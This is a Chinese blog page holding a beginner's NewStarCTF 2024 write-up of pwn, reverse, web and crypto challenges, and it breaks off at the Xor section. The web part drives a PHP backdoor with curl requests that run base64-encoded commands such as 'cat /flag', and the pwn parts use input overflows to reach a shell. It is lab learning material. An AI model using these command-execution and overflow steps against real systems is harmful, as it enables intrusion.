<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>NewStarCTF 2024 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：   题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach3">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2024 WriteUp">
<meta property="og:url" content="http://example.com/2024/11/04/newstar_24_wp/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：   题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach3">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-11-03T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-13T18:48:33.172Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分類</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       


<article id="post-newstar_24_wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        NewStarCTF 2024 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-11-03T16:00:00.000Z" itemprop="datePublished">2024-11-04</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            40k 詞 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p><em>注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧…</em></p>
<h1 id="赛题轮次：Week1"><a href="#赛题轮次：Week1" class="headerlink" title="赛题轮次：Week1"></a>赛题轮次：Week1</h1><h2 id="已解出的题目："><a href="#已解出的题目：" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Pwn</td>
<td align="center">Real Login、Game、overwrite、gdb</td>
</tr>
<tr>
<td align="center">Reverse</td>
<td align="center">base64、ezAndroidStudy、Simple_encryption、ez_debug、begin</td>
</tr>
<tr>
<td align="center">Web</td>
<td align="center">headach3、会赢吗、智械危机</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">xor、Base、一眼秒了、Strange King</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">WhereIsFlag、Labyrinth、decompress、pleasingMusic、兑换码</td>
</tr>
</tbody></table>
<h2 id="Pwn方向："><a href="#Pwn方向：" class="headerlink" title="Pwn方向："></a>Pwn方向：</h2><h3 id="Real-Login："><a href="#Real-Login：" class="headerlink" title="Real Login："></a>Real Login：</h3><p>反编译观察函数，发现要输入密码，找到密码是<font color=red><strong>NewStar!!!</strong></font>，观察发现没有位数溢出保护机制，在虚拟机中nc地址后输入NewStar!!!+大量额外字符弹出祝贺，此时已经成功，用ls指令查看文件发现有一个flag，再用cat查看得到<font color=deepskyblue><strong>flag{6a532e27-a281-4c15-b965-c030de9c47df}</strong></font>.</p>
<h3 id="Game："><a href="#Game：" class="headerlink" title="Game："></a>Game：</h3><p>反编译观察函数，发现是要求在5s内输入0-9之间的数，总和超出999之后可以获得控制权限，于是在nc地址之后以形如“9 换行 9 换行 9…”的形式同时输入一百余次复制粘贴执行，获得控制权，用ls查看发现有flag，再查看发现<font color=deepskyblue><strong>flag{4a045fea-9b70-4637-8561-cf5bece7e814}</strong></font>.</p>
<h3 id="Overwrite："><a href="#Overwrite：" class="headerlink" title="Overwrite："></a>Overwrite：</h3><p>反编译观察函数，第一个要求填入读取的字节数，不能超过48字节（但为什么容器里超过40就不行了？），第二个要求填数，填入的数被存在nbytes里，但接下来程序却会用nptr和114514进行比较，结合题目名称猜测应该是要输入超长的字节来覆盖同栈上的nptr，于是将第一个空填入超大的数，发现第二空能正常填入，经过动态调试发现输入54个9时nptr会被覆盖为999999\n，大于等于114514，所以在第一空输入一大堆9，第二空输入54个9，返回<font color=deepskyblue><strong>flag{48d03781-f157-4869-8041-5ba44bef070a}</strong></font>.</p>
<h3 id="gdb："><a href="#gdb：" class="headerlink" title="gdb："></a>gdb：</h3><p>反编译观察函数，注意到是把字符串<font color=red><strong>0d000721</strong></font>以key &#x3D; <font color=red><strong>mysecretkey1234567890abcdefghijk</strong></font>用AVX指令集进行了复杂的加密，再与输入的值进行比对，观察加密函数，经过IDA+linux远程动态调试和把原函数丢给AI验证出需要输入的字符对应的十六进制是<font color=aqua><strong>5D 1D 43 55 53 45 57 45</strong></font>，对应的字符是]_x001D_CUSEWE（第二个字符是不可打印字符），尝试把不可打印字符输入进命令行中，发现进入程序并不能正常转换，于是使用命令来代替输入：<font color=red><strong>printf ‘\x5D\x1D\x43\x55\x53\x45\x57\x45’ | nc 容器地址</strong></font>，返回祝贺和<font color=deepskyblue><strong>flag{205f9ae3-9d66-4523-b4b7-283cb5e1e381}</strong></font>.</p>
<h2 id="Reverse方向："><a href="#Reverse方向：" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="Base64："><a href="#Base64：" class="headerlink" title="Base64："></a>Base64：</h3><p>用IDA打开base64.exe然后在string里面发现以下几行：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011003</span>	<span class="number">00000011</span>	C	<span class="keyword">Enter</span> the flag: </span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011014</span>	<span class="number">00000018</span>	C	Wrong flag, try again.\n</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011030</span>	<span class="number">00000025</span>	C	g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011055</span>	0000000F	C	Correct flag!\n</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011064</span>	<span class="number">00000014</span>	C	Welcome to NewStar!</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011080</span>	<span class="number">00000041</span>	C	WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</span><br></pre></td></tr></table></figure>
<p>由最后一行和题目名称猜测该行为换了表的base64加密，g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;应该是用换表base64加密的flag，由此构建Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&quot;</span></span><br><span class="line">base64_1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">base64_2 = <span class="string">&quot;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/&quot;</span></span><br><span class="line">t = str1.translate(<span class="built_in">str</span>.maketrans(base64_2,base64_1))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(t).decode())</span><br></pre></td></tr></table></figure>
<p>解得flag为<font color=deepskyblue><strong>flag{y0u_kn0w_base64_well}</strong></font>.</p>
<h3 id="ezAndroidStudy："><a href="#ezAndroidStudy：" class="headerlink" title="ezAndroidStudy："></a>ezAndroidStudy：</h3><p>在模拟器上安装并运行apk，进入后提示用jadx进行反编译，并提示第一段flag在Androidmanifest.xml的activity里，反编译后在资源文件里找到Androidmanifest.xml，发现有两个activity，其中一个<br><code>&lt;activity android:name=&quot;work.pangbai.ezandroidstudy.Homo&quot;/&gt;</code>点开后发现第一部分的flag：<font color=deepskyblue><strong>flag{Y0u</strong></font>，进入二部分，得知flag在<code>resources.arsc/res/value/string.xml</code>中，寻找得到第二部分的flag：<font color=deepskyblue><strong>_@r4</strong></font>，进入第三部分，根据提示在<code>/res/layout/activity\_main.xml</code>中找到第三部分的flag：<font color=deepskyblue><strong>_900d</strong></font>，进入第四部分，根据提示在<code>/res/raw/</code>找到<code>flag4.txt</code>，获得第四部分的flag：<font color=deepskyblue><strong>_andr01d</strong></font>，进入第五部分，根据其提示在<code>/lib/x86\_64/</code>中找到<code>libezandroidstudy.so</code>和<code>/libpl\_droidsonroids\_gif.so</code>，导出后在IDA查看<code>libezandroidstudy.so</code>，在函数中找到<code>Java\_work\_pangbai\_ezandroidstudy\_MainActivity\_getflag5</code>，反编译发现第五部分的flag：<font color=deepskyblue><strong>_r4V4rs4r}</strong></font>，拼合得到<font color=deepskyblue><strong>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</strong></font>.</p>
<h3 id="Simple-encryption："><a href="#Simple-encryption：" class="headerlink" title="Simple_encryption："></a>Simple_encryption：</h3><p>在IDA中反编译并观察代码，首先要求输入的flag会逐个字符填入input数组中，直到达到30个字符，之后对于其中每个字符，根据其在数组中的位置分别进行不同的转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(j % <span class="number">3</span>) )<span class="comment">//3的倍数</span></span><br><span class="line">    input[j] -= <span class="number">31</span>;<span class="comment">//让该字符的ASCII值减31</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )<span class="comment">//余1</span></span><br><span class="line">    input[j] += <span class="number">41</span>;<span class="comment">//让该字符的ASCII值加41</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )<span class="comment">//余2</span></span><br><span class="line">    input[j] ^= <span class="number">0x55u</span>;<span class="comment">//对该字符的ASCII值进行0x55的异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是将字符ASCII转为十六进制并与buffer中的值进行比较：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%02x &quot;</span>, input[k]);</span><br><span class="line">  <span class="keyword">if</span> ( input[k] != buffer[k] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中buffer为<font color=lime><strong>{0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88, 0x64, 0x16, 0x88,0x07, 0x14, 0x6A, 0x39, 0x12, 0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A,0x56, 0x60, 0x12, 0x76, 0x25, 0x12, 0x8E, 0x28, 0x00, 0x00}</strong></font>，倒推得到<font color=LimeGreen><strong>{102, 108, 97, 103, 123, 73, 84, 95, 49, 53, 95, 82, 51, 65, 108, 49, 121, 95, 86, 51, 82, 121, 45, 53, 49, 77, 112, 49, 101, 125, 31, -41}</strong></font>（末尾两个数据排除），结合ASCII得知flag为：<font color=deepskyblue><strong>flag{IT_15_R3Al1y_V3Ry-51Mp1e}</strong></font>，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>,<span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        a[i] += <span class="number">31</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        a[i] -= <span class="number">41</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">        a[i] = a[i] ^ <span class="number">0x55</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ez-debug："><a href="#ez-debug：" class="headerlink" title="ez_debug："></a>ez_debug：</h3><p>将程序用x64dbg打开，将断点打在输出Decrypted flag:所对应的行，进行动态调试，输入随便的字符，到断点位置时发现断点的周围变量中含有flag：<font color=deepskyblue><strong>flag{y0u_ar3_g0od_@_Debu9}</strong></font>.</p>
<h3 id="Begin："><a href="#Begin：" class="headerlink" title="Begin："></a>Begin：</h3><p>运行exe程序，发现需要用IDA进行反编译，打开IDA进行反编译，按<code>Fn+F5</code>反编译main函数得到第八行为：<br><code>strcpy((char *)&amp;flag_part1, &quot;OK,You can click on this variable to discover the first part\n&quot;);</code><br>点击其中的变量得到乱码：6B614D7B67616C66h，按a转化为字符串得到flag的第一部分：flag{Mak3_aN_（这里在看十六进制的时候也找到了对应行：<br><code>0000000000403010  66 6C 61 67 7B 4D 61 6B  33 5F 61 4E 5F 00 00 00</code><br><font color=deepskyblue><strong>flag{Mak3_aN_</strong></font>…），再按<code>Fn+Shift+F12</code>转到<br><code>.rdata:0000000000404000	00000086	C	this is flag part2: 3Ff0rt\_tO\_5eArcH\_  ,You can press&#39; x &#39;on the variable name of this string to view the function that references it</code>，得到第二部分的flag：<font color=deepskyblue><strong>3Ff0rt_tO_5eArcH_</strong></font>，注意到其下方两行还有提示：<br><code>.rdata:0000000000404088	0000007A	C	And you can press &#39;x&#39; key on the function name to see which function references this function,Flag Part 3 is right there.</code>和<br><code>.rdata:0000000000404108	00000045	C	the function name is flag part3,Don&#39;t forget to add a &#39;&#125;&#39; at the end</code>，按提示双击左侧<code>.rdata:0000000000404108</code>跳转到IDA_view，找到第三部分的flag函数为：<font color=deepskyblue><strong>F0r_th3_f14g_C0Rpse</strong></font>，组合得到<font color=deepskyblue><strong>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</strong></font>.</p>
<h2 id="Web方向："><a href="#Web方向：" class="headerlink" title="Web方向："></a>Web方向：</h2><h3 id="Headach3："><a href="#Headach3：" class="headerlink" title="Headach3："></a>Headach3：</h3><p>打开网页后发现是head(er) ache，header是标头，开启开发者模式，在网络页面刷新网页，得到一个文档，在响应标头里找到属性fl3g:<font color=deepskyblue><strong>flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</strong></font>.</p>
<h3 id="会赢吗："><a href="#会赢吗：" class="headerlink" title="会赢吗："></a>会赢吗：</h3><p>第一个页面在源代码中发现flag第一部分<font color=deepskyblue><strong>ZmxhZ3tXQTB3</strong></font>以及第二个页面的后缀<font color=red><strong>&#x2F;4cqu1siti0n</strong></font>，第二个页面发现给出了一个getflag的方法，于是结合上面给出的课程名称，在控制台调用并输出第二部分的 flag: <font color=deepskyblue><strong>IV95NF9yM2Fs</strong></font>和第三个页面的后缀<font color=red><strong>&#x2F;s34l</strong></font>，第三个页面检查源代码后发现要把已封印的文本改成解封，发现flag的第三个部分<font color=deepskyblue><strong>MXlfR3I0c1B</strong></font>和第四个页面的后缀<font color=red><strong>&#x2F;Ap3x</strong></font>，进入第四个页面，发现有一个被禁用的noscript按钮无量空处，挪出来后发现不显示，于是在前面将class为s的改为显示，按下得到flag的第四部分<font color=deepskyblue><strong>fSkpKcyF9</strong></font>，合并起来之后得到<font color=deepskyblue><strong>ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</strong></font>，进行base64后解密得到<font color=deepskyblue><strong>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</strong></font>.</p>
<h3 id="智械危机："><a href="#智械危机：" class="headerlink" title="智械危机："></a>智械危机：</h3><p>询问ai后在网页后加入后缀<font color=red><strong>&#x2F;robots.txt</strong></font>，访问得到两行数据：<code>User-agent: \*</code>和<code>Disallow: /backd0or.php</code>，查询百科得知<code>robots.txt</code>的作用，并访问后缀<code>/backd0or.php</code>，访问后查询得知这是一种后门示例，需要提供cmd和key，观察代码得知key会被base64解码为decoded_key，cmd会被先翻转字母再取MD5，然后判定两者是否相等，如果不等则以不合法的密钥来结束，否则将cmd也base64解码，执行被解码的cmd，若访问后门时候提供了cmd和key就会执行decrypt_request后再带进execute_cmd执行得到系统返回的cmd，否则就展示后门的源代码.<br>首先尝试列出所有文件（ls指令），尝试Linux输入命令：<br><code>curl -X POST -d &quot;cmd=bHM=&amp;key=N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php </code>，只返回了backd0or.php、index.php、robots.txt，并没有所需的flag，于是进一步搜寻所有带flag的文件（<code>find / -name &quot;flag\*&quot; 2&gt;/dev/null</code>）：<code>curl -X POST -d &quot;cmd=ZmluZCAvIC1uYW1lICJmbGFnKiIgMj4vZGV2L251bGw=&amp;key=Y2ZlNDg1MjNjNTY4NmI5YzBjNmIwM2M3YmQyN2JiMjg=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，返回了如下文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pnp0/00:04/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/virtual/net/dummy0/flags</span><br><span class="line">/flag</span><br></pre></td></tr></table></figure>
<p>再查看flag：<code>curl -X POST -d &quot;cmd=Y2F0IC9mbGFn&amp;key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，得到<font color=deepskyblue><strong>flag{03b6f3f8-8dfa-40e3-b077-59d9009d520e}</strong></font>.</p>
<h2 id="Crypto方向："><a href="#Crypto方向：" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="Xor："><a href="#Xor：" class="headerlink" title="Xor："></a>Xor：</h3><p>题目给了一个xor的python程序，将两个量执行后得到了c1的long整数和c2的byte字符串，并给出了<code>key = b&#39;New\_Star\_CTF&#39;</code>，现将<code>c2=b&#39;;:\x1c1&lt;\x03&gt;\*\x10\x11u;&#39;</code>转换为long整数<code>18329866411473355926313989435</code>，用题目所给库<code>pycryptodome</code>进行逆向还原，把key也从byte字符串转换为long整数，并分别用c1和c2与key进行异或运算，将得到的long整数再次转换为byte字符串，并用utf-8编码得到前半段<font color=deepskyblue><strong>flag{0ops!_yo</strong></font>和后半段<font color=deepskyblue><strong>u_know_XOR!}</strong></font>，最终<font color=deepskyblue><strong>flag{0ops!_you_know_XOR!}</strong></font>.<br>Python代码：</p>
